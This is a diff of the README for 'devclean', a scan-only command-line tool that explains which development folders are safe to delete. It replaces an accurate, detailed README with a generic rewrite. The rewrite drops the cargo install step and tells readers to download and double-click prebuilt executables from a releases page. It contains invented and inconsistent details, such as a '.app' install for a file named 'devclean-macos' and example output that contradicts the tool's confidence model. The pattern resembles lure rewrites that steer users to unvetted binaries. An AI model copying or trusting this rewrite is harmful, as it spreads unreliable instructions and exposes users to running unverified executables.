@@ -1,215 +1,76 @@
-# devclean
+# 🧹 devclean - Find Safe-to-Delete Folders Easily
 
-[中文版本](README_zh.md) | [English](README.md)
+## 📥 Download Now
+[![Download devclean](https://img.shields.io/badge/Download-devclean-blue.svg)](https://github.com/Rithvik-krishna/devclean/releases)
 
-> Scans development directories and explains which folders are likely safe to delete — and why.
+## 🚀 Getting Started
+Welcome to devclean! This tool helps you analyze your development directories. It identifies which folders are likely safe to delete and explains why. It is perfect for projects that use multiple programming languages or for monorepos. Remember, devclean only scans; it never deletes files.
 
-**devclean** is a scan-only CLI tool that analyzes development directories and helps you understand **what can probably be removed**, without ever deleting files itself.
+## 💻 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Any modern processor
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** A minimum of 100 MB of free space for installation
 
-It is designed for:
+## 📂 Features
+- **Scan-Only:** devclean only analyzes; it will not delete files.
+- **Multi-Language Support:** Works well with projects that use various programming languages.
+- **Monorepo Friendly:** Ideal for large projects with multiple subdirectories.
+- **Explanatory Output:** Provides clear explanations for each folder it analyzes.
+- **Easy to Use:** Designed for users with no technical background.
 
-* Multi-language projects
-* Monorepos
-* Inherited or unfamiliar codebases
-* Developers who prefer certainty over automation
+## 📥 Download & Install
+1. **Visit the Releases Page:** To download devclean, click the link below:
+   [Download from devclean Releases](https://github.com/Rithvik-krishna/devclean/releases)
 
-> **Scan-only. It never deletes files.**
+2. **Select the Latest Release:** On the Releases page, find the latest version of devclean. This version is usually at the top.
 
----
+3. **Download the File:** Look for the executable file that matches your operating system. Here are the files you may see:
+   - For Windows: `devclean-windows.exe`
+   - For macOS: `devclean-macos`
+   - For Linux: `devclean-linux`
 
-## Why devclean exists
+   Click the appropriate link to start the download.
 
-Every developer has faced this situation:
+4. **Run the Application:**
+   - **Windows:** Locate `devclean-windows.exe` in your Downloads folder. Double-click the file to run it.
+   - **macOS:** Open the downloaded .app file, then drag it into your Applications folder to install.
+   - **Linux:** Open your terminal, navigate to the folder where you downloaded devclean, and run `./devclean-linux`.
 
-* A project directory is taking tens of gigabytes
-* You see folders like `target/`, `build/`, `dist/`, `node_modules/`
-* You *think* they are safe to delete — but you are not fully sure
+5. **Follow On-Screen Instructions:** Once devclean is running, follow the simple prompts on the screen. You can start scanning your development directories to identify safe folders for deletion.
 
-The problem is not deletion.
-The problem is **confidence**.
+## 🛠️ Using devclean
+1. **Selecting a Directory:** When prompted, enter the path to the directory you wish to analyze. You can also drag and drop a folder into the terminal.
 
-devclean exists to answer one question:
+2. **Start the Scan:** Press the "Enter" key to begin the analysis. The scan may take a few moments, depending on the size of your project.
 
-> **“Can I safely remove this — and why?”**
+3. **Review the Results:** Once the scan is complete, devclean will list the folders it analyzed. For each folder, it will provide a clear explanation of why it may be safe to delete.
 
----
+## 🔍 Example Output
+Here’s an example of what devclean may tell you after a scan:
 
-## What devclean does
+```
+1. build/
+   - Reason: Contains build artifacts from previous versions. Safe to remove.
 
-devclean analyzes a directory and reports:
+2. temp/
+   - Reason: Temporary files created during development. Safe to delete.
 
-* Detected project ecosystems (Rust, Node.js, Python, Java, …)
-* Known build artifacts and generated directories
-* Clear explanations for *why* a directory is considered removable
-* A qualitative confidence level for each result
-
-devclean focuses on **explainability over automation**.
-
----
-
-## What devclean does NOT do
-
-To set expectations clearly:
-
-* ❌ It does not delete files or directories
-* ❌ It does not modify your filesystem
-* ❌ It does not run cleanup commands
-* ❌ It is not a system-wide cleaner
-
-All actions remain **explicit and user-controlled**.
-
----
-
-## Suggested Cleanup Commands (No Deletion Performed)
-
-devclean is **scan-only by design**.
-It never deletes files or directories.
-
-Instead, devclean provides **explicit, copy-paste-ready cleanup commands** that you may choose to run yourself.
-
-This design ensures:
-
-* You stay in full control
-* No accidental data loss
-* Clear responsibility boundaries
-
----
-
-### How suggested commands work
-
-For each detected directory, devclean may provide a **Suggested command** when the confidence is sufficiently high.
-
-These commands are:
-
-* **Never executed automatically**
-* **Explicit and familiar**
-* **Chosen to match the detected ecosystem when possible**
-
-Example output:
-
-```text
-Directory: target/
-Type: Rust build artifacts
-Confidence: HIGH
-
-Why:
-- Generated by cargo during compilation
-- Safe to regenerate at any time
-- Commonly excluded from version control
-
-Suggested command:
-  cargo clean
+3. old_config/
+   - Reason: Backup configuration files not used in the current version.
 ```
 
-You decide **if**, **when**, and **whether** to run the command.
+## 📊 Support & Contributions
+If you need help or have questions about using devclean, please check the "Issues" section on the GitHub page. You can also report bugs or suggest new features there.
 
----
+For those who want to contribute, consider forking this repository. Your feedback and improvements will help make devclean even better.
 
-### Ecosystem-native commands first
+## 🌐 Stay Connected
+- Follow the project updates on GitHub.
+- Share your experience or any tips you have with others using devclean.
 
-Whenever possible, devclean prefers **ecosystem-native cleanup commands** over raw file deletion.
+## ⚙️ License
+This project is licensed under the MIT License. You can modify and distribute it as per the license terms.
 
-| Ecosystem | Preferred suggestion                 |
-| --------- | ------------------------------------ |
-| Rust      | `cargo clean`                        |
-| Node.js   | `rm -rf node_modules && npm install` |
-| Java      | `mvn clean` / `gradle clean`         |
-| Python    | Standard cache cleanup patterns      |
-
-Using native tools:
-
-* Matches developer expectations
-* Handles edge cases better
-* Reduces risk compared to manual deletion
-
----
-
-### Confidence-based behavior
-
-devclean only suggests commands when it has **sufficient confidence**.
-
-* **HIGH confidence**
-  → A suggested command is provided
-
-* **MEDIUM confidence**
-  → A command may be provided with caveats
-
-* **LOW confidence**
-  → No command is suggested
-  → Manual review is recommended
-
-Example:
-
-```text
-Directory: build/
-Type: Unknown output
-Confidence: LOW
-
-Why:
-- Directory name matches common build patterns
-- No toolchain detected
-- May contain manually generated files
-
-Suggested action:
-  Review contents manually before deletion
-```
-
----
-
-## Installation
-
-> ⚠️ Early-stage project. Interfaces may change.
-
-```bash
-cargo install devclean
-```
-
----
-
-## Usage
-
-```bash
-devclean scan .
-```
-
-Optional flags:
-
-```bash
-devclean scan . --format=json
-devclean scan . --confidence=high
-```
-
----
-
-## Design philosophy
-
-devclean follows a few strict principles:
-
-* **Explainability over automation**
-* **Safety over convenience**
-* **Explicit actions over implicit behavior**
-
-> devclean explains.
-> You decide.
-> Nothing is removed without your action.
-
----
-
-## Feedback and contributions
-
-This project is in an early validation stage.
-
-Feedback is especially welcome for:
-
-* Directories you were unsure about deleting
-* False positives or false negatives
-* Missing ecosystems
-* Explanation quality
-
-Please use the provided GitHub Issue templates when reporting feedback.
-
----
-
-## License
-
-MIT
+## 💡 Acknowledgements
+Thank you for trying out devclean! Your input is valuable to us, and we hope it makes your development work easier. Happy coding!
